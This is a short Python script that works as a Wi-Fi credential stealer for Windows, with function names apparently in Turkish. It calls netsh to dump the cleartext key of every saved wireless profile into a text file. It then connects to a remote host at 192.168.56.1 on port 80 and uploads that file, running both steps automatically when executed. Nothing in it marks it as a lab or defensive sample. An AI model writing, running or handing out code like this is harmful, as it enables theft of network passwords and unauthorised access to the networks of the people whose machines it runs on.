import subprocess
import sys
import os
import time
import socket
import tqdm

def sifre_al():
    data=subprocess.check_output(["netsh","wlan","show","profiles"]).decode("utf-8").split("\n")
    profiles=[i.split(":")[1][1:-1]for i in data if "All User Profile" in i]

    file_path= os.getcwd()
    file=open(file_path+"\Sifreler.txt","w")
    for i in profiles:
        results= subprocess.check_output(["netsh","wlan","show","profile",i,"key=clear"]).decode("utf-8").split("\n")
        results=[b.split(":")[1][1:-1] for b in results if "Key Content" in b]

        try:
            sifre=f"{i}:{results[0]}"
        
            file.write(f"{sifre}\n")
            print(sifre)
        
        except IndexError:
            a=""
            print(f"{i}:{a}")

    print("Data transferred to Sifreler.txt ")

    

def client():
    print("Creating client socket..")


    server="192.168.56.1"
    port=80
    #def define_addr(server,port):
    addr=(server,port)
    #return addr
    SEPARATOR="<SEPARATOR>"
    BUFFER_SIZE=4096
    #def create_socket(addr):
    s=socket.socket()
    s.connect(addr)
    print("[+]Connecting to {server}:{port}")
    print("[+]Connected")
    time.sleep(1)
        #return
    file_path= os.getcwd()

    #def send_file():
    filename= file_path+"\Sifreler.txt"
    filesize= os.path.getsize(filename)
    s.send(f"{filename}{SEPARATOR}{filesize}".encode("utf-8"))

    progress = tqdm.tqdm(range(filesize), f"Sending {filename}", unit="B", unit_scale=True, unit_divisor=1024)
    with open(filename, "rb") as f:
        for bytes_read in progress:
            # read the bytes from the file
            bytes_read = f.read(BUFFER_SIZE)
            if not bytes_read:
                # file transmitting is done
                break
            # we use sendall to assure transimission in 
            # busy networks
            s.sendall(bytes_read)
            # update the progress bar
            progress.update(len(bytes_read))
    # close the socket
    s.close()
    print("File has been sent.")

sifre_al()
time.sleep(3)
client()